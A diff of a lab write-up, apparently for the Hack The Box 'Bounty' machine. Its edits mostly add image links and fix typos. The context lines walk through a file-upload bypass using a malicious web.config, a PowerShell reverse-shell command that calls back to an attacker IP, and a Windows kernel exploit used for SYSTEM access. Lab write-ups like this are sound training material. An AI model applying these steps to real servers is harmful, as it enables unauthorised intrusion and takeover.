@@ -33,23 +33,25 @@ Looks like only port 80 HTTP is open for TCP. That's a bit odd because usually W
 
 Looking at the webpage we find a jpeg of a wizard:
 
-bounty_merlin.png
+![bounty_merlin.png](../assets/bounty_assets/bounty_merlin.png)
 
 Starting some directory scanning we find a `/transfer.aspx` endpoint, as well as `/uploadedfiles`
 
+![bounty_dirs.png](../assets/bounty_assets/bounty_dirs.png)
+
 Looking at `/transfer.aspx` we find a simple file upload:
 
-bounty_transfer_page.png
+![bounty_transfer_page.png](../assets/bounty_assets/bounty_transfer_page.png)
 
 Trying to access `/uploadedfiles` however we get access denied.
 
-bounty_denied.png
+![bounty_denied.png](../assets/bounty_assets/bounty_denied.png)
 
 Trying to upload a file called test.txt, we get this error: `Invalid File. Please try again`
 
 Capturing the request in Burp and manually trying a few different file types, I fund we can successfully load a .doc file:
 
-bounty_burp1.png
+![bounty_burp1.png](../assets/bounty_assets/bounty_burp1.png)
 
 This also works for docx files too.
 
@@ -57,9 +59,9 @@ However I'm still unable to access these files from `/uploadedfiles` as we get a
 
 My first instinct is to use something like https://github.com/Greenwolf/ntlm_theft to create a malicious file to steal NTLM hashes as a client side attack, but I'm not sure there's any service on the other end that would 'open' the file. But more importantly, even if I did capture a hash, what would I do with it? So far in my enumeration there is nowhere to login and no other services running. 
 
-Going back to Burp I notice we can also upload .config files. 
+Going back to Burp and manually trying more file extensions, I notice we can also upload .config files. Thats interesting. 
 
-Lets try loading a malicious web.config file that will download and execute a powershell revers shell.
+Lets try loading a malicious web.config file that will download and execute a powershell reverse shell.
 
 ### Exploitation
 
@@ -80,7 +82,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.114 -Port 443
 
 Lets set up a python http.server and our listener and load the web.config file:
 
-bounty_good.png
+![bounty_good.png](../assets/bounty_assets/bounty_good.png)
 
 We can then call the script by navigating to: http://10.129.151.131/uploadedfiles/web.config
 
@@ -108,9 +110,9 @@ PS C:\windows\system32\inetsrv> hostname
 bounty
 ```
 
-We can then find the user flag using `dir -Force`:
+We can then find the hidden user flag using `dir -Force`:
 
-bounty_user_flag.png
+![bounty_user_flag.png](../assets/bounty_assets/bounty_user_flag.png)
 
 ### Privilege Escalation
 
@@ -181,7 +183,7 @@ Network Card(s):           1 NIC(s) Installed.
 ```
 We can see here we're on a Windows Server 2008 R2 and that no hotfixes have been made.
 
-This is likely vulnerable to a kernel exploit based on the age of the box and the fact its not been patched. 
+This is likely vulnerable to a kernel exploit based on the age of the box and the fact it has not been patched. 
 
 Lets use: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012/Chimichurri
 
@@ -213,7 +215,7 @@ nt authority\system
 
 And we can now grab the root.txt flag:
 
-bounty_root_flag.png
+![bounty_root_flag.png](../assets/bounty_assets/bounty_root_flag.png)
 
 Thanks for following along!
 
